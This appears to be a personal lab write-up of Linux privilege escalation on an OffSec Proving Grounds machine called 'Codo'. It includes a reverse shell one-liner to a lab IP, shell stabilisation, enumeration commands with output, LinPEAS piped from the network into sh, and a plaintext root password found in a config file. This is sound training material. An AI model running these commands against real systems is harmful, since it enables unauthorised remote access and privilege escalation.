# Linux Privilege Escalation

# Create Nested and Stabilized Shell

(Create new listener and shell)
`sh -i >& /dev/tcp/192.168.45.151/1235 0>&1`

(In nested shell)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
(Ctrl-Z)
stty raw -echo; fg
```

# Phase 1: System Information Gathering

## Basic System Info
```
# System details
uname -a
cat /etc/os-release
cat /etc/issue
hostname
whoami
id

# Current user info
groups
sudo -l
cat /etc/passwd | grep -E "(sh|bash)$"
cat /etc/group
```

```
# System details
www-data

Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

codo

# Current user info

uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data
```

## Running Processes & Services
```
ps aux
ps -ef
systemctl list-units --type=service --state=running
netstat -tulpn
ss -tulpn
```

## Process Monitoring with pspy
```
# Download and run pspy to monitor background processes
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64

# Look for:
# - Cron jobs running as root
# - Scripts with writable paths
# - Processes running with elevated privileges
# - File operations you can intercept
```

(No findings)


# Phase 2: Automated Enumeration

## LinPEAS (Primary Tool)
```
# Transfer and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download and run locally
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS helped me discover a password in the application's config.php file:

`/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',`
(Added to credentials in [[Archive/OFFSEC - Proving Grounds Writeups/Linux/Codo/index|index]]).

I didn't think much of this initially, which was a big mistake. After enumerating further, I didn't find anything else and eventually found that this is root's password!

![[Pasted image 20250819182446.png]]
